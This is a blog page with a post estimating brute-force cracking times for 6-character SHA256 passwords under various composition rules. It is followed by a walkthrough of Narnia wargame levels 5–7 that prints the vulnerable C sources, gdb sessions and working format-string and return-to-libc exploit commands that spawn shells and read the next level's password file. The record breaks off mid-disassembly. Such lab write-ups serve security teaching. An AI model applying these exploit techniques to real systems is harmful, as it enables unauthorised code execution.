<p>Let&rsquo;s assume that I have a list of password hashes from somewhere. I know
that the password is exactly 6 characters long (which I think is
a reasonably common password length these days), and I also know what rules
govern the choice of password when it is created. We&rsquo;ll look at these rules in
turn and see how much difference they make. I fix the password length so I don&rsquo;t
introduce too many variables.</p>

<p>I&rsquo;ll be basing the calculations of a few assumptions:</p>

<ul>
<li>Hashes are SHA256</li>
<li>We have a <em>reasonable</em> PC available (1x NVidia gtx580), managing 355 Mh/s (355,000,000 hashes/s) (<a href="https://hashcat.net/oclhashcat/#performance">ref</a>)</li>
<li>These are pure bruteforce attacks. No wordlists, permutation or combination attacks</li>
<li>Timings for each attack assume <em>worst case</em>. i.e. we have to run through all guesses.
Usually an attack stops when a valid match is found, shortening the attack.</li>
</ul>

<p>Let&rsquo;s analyse how different password creation rules affect the duration of the attack.</p>

<p>For reference, these are the number of possible combinations for each set of
characters</p>

<table>
<thead>
<tr>
<th>Possible characters</th>
<th>Character count</th>
<th>Number of combinations</th>
</tr>
</thead>

<tbody>
<tr>
<td>lower only</td>
<td>26</td>
<td>308,915,776</td>
</tr>

<tr>
<td>upper and lower</td>
<td>52</td>
<td>19,770,609,664</td>
</tr>

<tr>
<td>upper, lower, digits</td>
<td>62</td>
<td>56,800,235,584</td>
</tr>

<tr>
<td>upper, lower, digits, special</td>
<td>94</td>
<td>689,869,781,056</td>
</tr>
</tbody>
</table>

<h2 id="no-rules:419b03a80de203f007f6beb7b93557c6">No rules</h2>

<p>Using any combination of characters the number of possible passwords is <em>689,869,781,056</em>.
It would take <em>1943.29 seconds</em> (689,869,781,056 / 355,000,000) to crack this password.
That&rsquo;s just over half an hour.</p>

<p><em>Attack time</em>: 1943.29seconds</p>

<h2 id="at-least-one-upper-case:419b03a80de203f007f6beb7b93557c6">At least one upper case</h2>

<p>If we are forced to chose at least one upper case character, we are also saying that
there are no passwords now with just lowercase characters. The number of possible
combinations is now <em>689,869,781,056 - 308,915,776 = 689,560,865,280</em>, or <em>99%</em> of
the original search space. This is a small impact of only 1 second.</p>

<p><em>Attack time</em>: 1942.42seconds</p>

<h2 id="at-least-one-upper-case-and-one-digit:419b03a80de203f007f6beb7b93557c6">At least one upper case and one digit</h2>

<p>Now we know that there are no passwords with just lowercase, or with lower and uppercase only.
Therefore we can also remove these from the list of possibilities. Our new number is now
<em>689,869,781,056 - 308,915,776 - 19,770,609,664 = 669,790,255,616</em> or <em>97%</em> of our search space.
Now we&rsquo;re starting to see savings of up around 100seconds. In the grand scheme of things,
still not much</p>

<p><em>Attack time</em>: 1886.73seconds</p>

<h2 id="must-contain-all-of-the-above:419b03a80de203f007f6beb7b93557c6">Must contain all of the above</h2>

<p>Upper, lower, digits, and special all need to be present. Therefore we can remove all the
other possiblities for a grand total of:
<em>689,869,781,056 - 308,915,776 - 19,770,609,664 - 56,800,235,584 = 612,990,020,032</em> or
<em>88%</em> of the original. Now we&rsquo;ve saved another 100 seconds.</p>

<p><em>Attack time</em>: 1726.73seconds</p>

<h2 id="conclusion:419b03a80de203f007f6beb7b93557c6">Conclusion</h2>

<p>Although contrived, this scenario should indicate that <em>forcing</em> people to do
things in the interest of security can help attackers too. If we are allowed
to use any character out of the full set, an attack would have taken 4 minutes more than
if we are forced to create a <em>secure</em> password that <em>must</em> use certain characters.
The difference isn&rsquo;t much if you look above, but bear in mind that the longest attack
is <em>1.12</em> times longer. If we extrapolate this to a 8 character password,
it&rsquo;s a difference of almost 2 years (51.18 vs 49.7).</p>

<p>Needless to say, knowing the minimum length reduces the search space once again,
because now I won&rsquo;t even bother with anything below 8 characters. That&rsquo;s a fairly big
chunk of possibilities.</p>

<p>The times can be further optimised by employing wordlists, known substitutions and other
rules. The more you know about the nature of the password, the less time it takes
to crack it. Yes, applying rules and substitutions to wordlists takes time, but it&rsquo;s
insignificant to the amount of time they can shave off of a brute force attack. And
the more an attacker knows about the nature and composition of your password, the
better they can tailor their wordlists.</p>

<p>Even <a href="http://www.wired.com/2015/04/snowden-sexy-margaret-thatcher-password-isnt-so-sexy/">Edward Snowden&rsquo;s advice isn&rsquo;t bulletrpoof</a></p>

<p>The key really is not to force people to have a specific password combination, but
to encourage good password creation. Long, random, and unpredictable, passwords
from a large vat of possibilities.</p>

<p>Don&rsquo;t tell attackers what the password isn&rsquo;t. Let them guess.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/">
        Solving Narnia Part 2
      </a>
    </h1>

    <span class="post-date">Mon, Apr 13, 2015</span>

    

<p>Carrying on from <a href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/">Part 1</a></p>

<h2 id="level-05:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 05</h2>

<table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
 
<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
	<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">;</span>
	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">64</span><span style="color: #f8f8f2">];</span>

	<span style="color: #f8f8f2">snprintf(buffer,</span> <span style="color: #66d9ef">sizeof</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
	<span style="color: #f8f8f2">buffer[</span><span style="color: #66d9ef">sizeof</span> <span style="color: #f8f8f2">(buffer)</span> <span style="color: #f92672">-</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span style="color: #f8f8f2">);</span>

	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">==</span><span style="color: #ae81ff">500</span><span style="color: #f8f8f2">){</span>
		<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;GOOD</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
		<span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">}</span>

	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;No way...let me give you a hint!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;buffer : [%s] (%d)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">strlen(buffer));</span>
	<span style="color: #f8f8f2">printf</span> <span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;i = %d (%p)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">i,</span> <span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">i);</span>
	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>

<p>A fixed sized buffer again. This time however trying to overflow it in order to
write to <code>i</code> won&rsquo;t work. If we look at line 9 and lookup the manpage for <code>snprintf</code>
we see that</p>

<pre><code>The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte ('\0')) to str.
</code></pre>

<p>So we won&rsquo;t be able to overflow this buffer. Going through the usual possible exploits
we&rsquo;ve only really go one more to try: <a href="https://en.wikipedia.org/wiki/Uncontrolled_format_string">format string attack</a> or
<em>uncontrolled format string vulnerability</em>. This happens when user input
isn&rsquo;t checked, and allows the user to use format characters (<code>%s</code>, <code>%x</code>) to read or
manipulate the stack.</p>

<p>For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn&rsquo;t make sense at first, stick with it and
try various strings. Hopefully you&rsquo;ll grok it at some point.</p>

<p>Let&rsquo;s check to see if our hunch is right. Using a few characters to start, I
then append a list of <code>%x</code>, which read values from the stack and print them.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaa&#39;+&#39;%x&#39;*10&quot;`</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)
</pre></div>


<p>Sure enough we see the beginning of the input string after the 4th <code>%x</code>. So we then
put the address if <code>i</code> into that location like and shorten the number of <code>%x</code>.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*5&quot;`</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)
</pre></div>


<p>Now we have the address of <code>i</code>, we use <code>%n</code> to write to that address, remembering
to remove one <code>%x</code> to keep the right length.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*4 + &#39;%n&#39;&quot;`</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)
</pre></div>


<p>So we see that we&rsquo;ve written the length of the string into <code>i</code>. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*3 + &#39;%500d&#39; + &#39;%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)
</pre></div>


<p>We&rsquo;re <em>28</em> over the target, so let&rsquo;s reduce the padding</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia5@melinda:/narnia$ ./narnia5 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*3 + &#39;%472d&#39; + &#39;%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
Change i&#39;s value from 1 -&gt; 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
[password]
</pre></div>
</p>

<h2 id="level-06:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 06</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>

<span style="color: #66d9ef">extern</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">environ;</span>

<span style="color: #75715e">// tired of fixing values...</span>
<span style="color: #75715e">// - morla</span>
<span style="color: #66d9ef">unsigned</span> <span style="color: #66d9ef">long</span> <span style="color: #a6e22e">get_sp</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">)</span> <span style="color: #f8f8f2">{</span>
       <span style="color: #f8f8f2">__asm__(</span><span style="color: #e6db74">&quot;movl %esp,%eax</span><span style="color: #ae81ff">\n\t</span><span style="color: #e6db74">&quot;</span>
               <span style="color: #e6db74">&quot;and $0xff000000, %eax&quot;</span>
               <span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">argv[]){</span>
	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">b1[</span><span style="color: #ae81ff">8</span><span style="color: #f8f8f2">],</span> <span style="color: #f8f8f2">b2[</span><span style="color: #ae81ff">8</span><span style="color: #f8f8f2">];</span>
	<span style="color: #66d9ef">int</span>  <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fp)(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span><span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">)(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">))</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">puts,</span> <span style="color: #f8f8f2">i;</span>

	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span><span style="color: #f92672">!=</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">){</span> <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s b1 b2</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span> <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span> <span style="color: #f8f8f2">}</span>

	<span style="color: #75715e">/* clear environ */</span>
	<span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">=</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">environ[i]</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
		<span style="color: #f8f8f2">memset(environ[i],</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strlen(environ[i]));</span>
	<span style="color: #75715e">/* clear argz    */</span>
	<span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">=</span><span style="color: #ae81ff">3</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">argv[i]</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
		<span style="color: #f8f8f2">memset(argv[i],</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strlen(argv[i]));</span>

	<span style="color: #f8f8f2">strcpy(b1,argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
	<span style="color: #f8f8f2">strcpy(b2,argv[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]);</span>
	<span style="color: #75715e">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span>
	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(((</span><span style="color: #66d9ef">unsigned</span> <span style="color: #66d9ef">long</span><span style="color: #f8f8f2">)fp</span> <span style="color: #f92672">&amp;</span> <span style="color: #ae81ff">0xff000000</span><span style="color: #f8f8f2">)</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">get_sp())</span>
		<span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">fp(b1);</span>

	<span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>In this rather complicated looking listing we notice a few things:</p>

<ul>
<li>line 17 is a function pointer to <code>puts</code></li>
<li>line 33 calls the function <code>fp</code> points to</li>
<li>line 31 prevents <code>fp</code> from pointing to anything in our frame</li>
</ul>

<p>The last lines means we need to point <code>fp</code> to a call in a system library.
This is going to be a <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret to libc attack</a>. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute <code>system('/bin/sh')</code>. As luck would have it, <code>puts</code> and
<code>system</code> both have the same function definition: <code>int system(const char *command);</code> and
<code>int puts(const char *s);</code></p>

<p>Let&rsquo;s fire up gdb and figure out our addresses.
<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia6@melinda:/narnia$ gdb ./narnia6 -q
Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &lt;+0&gt;:	push   %ebp
   0x0804855a &lt;+1&gt;:	mov    %esp,%ebp
   0x0804855c &lt;+3&gt;:	push   %ebx
   0x0804855d &lt;+4&gt;:	and    $0xfffffff0,%esp
   0x08048560 &lt;+7&gt;:	sub    $0x30,%esp

    &lt;-- snip --&gt;

   0x0804869b &lt;+322&gt;:	movl   $0xffffffff,(%esp)      
   0x080486a2 &lt;+329&gt;:	call   0x8048410 &lt;exit@plt&gt;
   0x080486a7 &lt;+334&gt;:	lea    0x20(%esp),%eax
   0x080486ab &lt;+338&gt;:	mov    %eax,(%esp)
   0x080486ae &lt;+341&gt;:	mov    0x28(%esp),%eax
   0x080486b2 &lt;+345&gt;:	call   *%eax                &lt;-- calling *fp*
   0x080486b4 &lt;+347&gt;:	movl   $0x1,(%esp)
   0x080486bb &lt;+354&gt;:	call   0x8048410 &lt;exit@plt&gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:	0xffffd6a0	0xffffd8ac	0x00000021	0x08048712
0xffffd690:	0x00000003	0xffffd754	0x63636363	0x63636363
0xffffd6a0:	0x64646464	0x61616100	0x62626262	0x00000000
0xffffd6b0:	0x080486c0	0xf7fca000	0x00000000	0xf7e3ca63
0xffffd6c0:	0x00000003	0xffffd754	0xffffd764	0xf7feacea
0xffffd6d0:	0x00000003	0xffffd754	0xffffd6f4	0x08049978
0xffffd6e0:	0x08048290	0xf7fca000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x32aaee13	0x0a932a03	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000003	0x08048450
0xffffd710:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd720:	0x00000003	0x08048450	0x00000000	0x08048471
0xffffd730:	0x08048559	0x00000003	0xffffd754	0x080486c0
0xffffd740:	0x08048730	0xf7feb180
(gdb) p system
$<span style="color: #f8f8f2">1</span> <span style="color: #f92672">=</span> <span style="color: #f92672">{</span>&lt;text variable, no debug info&gt;<span style="color: #f92672">}</span> 0xf7e62cd0 &lt;system&gt;
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
</pre></div>
</p>

<p>What I did here was to disassemble the <code>main</code> function and find out where
<code>fp</code> is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to <code>fp</code>. What we see is
that <code>$esp</code> points to <code>0xffffd6a0</code>, which is where the last 4 values of
<code>b2</code> are stored. This is also the argument that will be passed to the <code>fp</code> call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to <code>/bin/sh</code>, and we want <code>fp</code> to point to <code>system</code>. This is
the reason for the <code>p system</code>, it tells us the location of <code>system</code>.
Also note that our <code>segfault</code> is showing us the last
4 digits of <code>b1</code>. Perfect, I can use that to overwrite <code>fp</code> with the address of
<code>system</code> and I should be good to go.</p>

<p>As this is a little more advanced, let&rsquo;s go over the steps:</p>

<ul>
<li>Get the address of the argument to whatever <code>fp</code> points to</li>
<li>Figure out how to overwrite that with our argument</li>
<li>Get the address of <code>system</code></li>
<li>Overwrite what <code>fp</code> points to with <code>system</code>&rsquo;s address</li>
<li>Assemble payload and hopefully get a shell</li>
</ul>

<p>So the last step:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia6@melinda:/narnia$ /games/narnia/narnia6 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;a&#39;*8 + &#39;\xd0\x2c\xe6\xf7&#39; +&#39; &#39;+ &#39;b&#39;*8 + &#39;/bin/sh&#39;&quot;`</span>
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
[password]
</pre></div>
</p>

<h2 id="level-07:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 07</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">goodfunction</span><span style="color: #f8f8f2">();</span>
<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">hackedfunction</span><span style="color: #f8f8f2">();</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">vuln</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">const</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">format){</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">128</span><span style="color: #f8f8f2">];</span>
    <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">ptrf)();</span>

    <span style="color: #f8f8f2">memset(buffer,</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buffer));</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;goodfunction() = %p</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">goodfunction);</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;hackedfunction() = %p</span><span style="color: #ae81ff">\n\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">hackedfunction);</span>

    <span style="color: #f8f8f2">ptrf</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">goodfunction;</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;before : ptrf() = %p (%p)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">ptrf,</span> <span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">ptrf);</span>

    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;I guess you want to come to the hackedfunction...</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">sleep(</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">ptrf</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">goodfunction;</span>

    <span style="color: #f8f8f2">snprintf(buffer,</span> <span style="color: #66d9ef">sizeof</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">format);</span>

    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">ptrf();</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
    <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">&lt;=</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">){</span>
            <span style="color: #f8f8f2">fprintf(stderr,</span> <span style="color: #e6db74">&quot;Usage: %s &lt;buffer&gt;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
            <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">}</span>
    <span style="color: #f8f8f2">exit(vuln(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]));</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">goodfunction</span><span style="color: #f8f8f2">(){</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Welcome to the goodfunction, but i said the Hackedfunction..</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">fflush(stdout);</span>
        
    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">hackedfunction</span><span style="color: #f8f8f2">(){</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Way to go!!!!&quot;</span><span style="color: #f8f8f2">);</span>
    <span style="color: #f8f8f2">fflush(stdout);</span>
    <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>

    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>The presence of <code>snprintf</code> indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let&rsquo;s attack this</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &lt;+0&gt;:	push   %ebp
   0x080485ce &lt;+1&gt;:	mov    %esp,%ebp
   0x080485d0 &lt;+3&gt;:	sub    $0xa8,%esp
   0x080485d6 &lt;+9&gt;:	movl   $0x80,0x8(%esp)
   0x080485de &lt;+17&gt;:	movl   $0x0,0x4(%esp)
   0x080485e6 &lt;+25&gt;:	lea    -0x88(%ebp),%eax
   0x080485ec &lt;+31&gt;:	mov    %eax,(%esp)
   0x080485ef &lt;+34&gt;:	call   0x80484b0 &lt;memset@plt&gt;
   0x080485f4 &lt;+39&gt;:	movl   $0x80486e0,0x4(%esp)
   0x080485fc &lt;+47&gt;:	movl   $0x80487d0,(%esp)
   0x08048603 &lt;+54&gt;:	call   0x8048420 &lt;printf@plt&gt;
   0x08048608 &lt;+59&gt;:	movl   $0x8048706,0x4(%esp)
   0x08048610 &lt;+67&gt;:	movl   $0x80487e5,(%esp)
   0x08048617 &lt;+74&gt;:	call   0x8048420 &lt;printf@plt&gt;
   0x0804861c &lt;+79&gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &lt;+89&gt;:	mov    -0x8c(%ebp),%eax
   0x0804862c &lt;+95&gt;:	lea    -0x8c(%ebp),%edx
   0x08048632 &lt;+101&gt;:	mov    %edx,0x8(%esp)
   0x08048636 &lt;+105&gt;:	mov    %eax,0x4(%esp)
   0x0804863a &lt;+109&gt;:	movl   $0x80487fd,(%esp)
   0x08048641 &lt;+116&gt;:	call   0x8048420 &lt;printf@plt&gt;
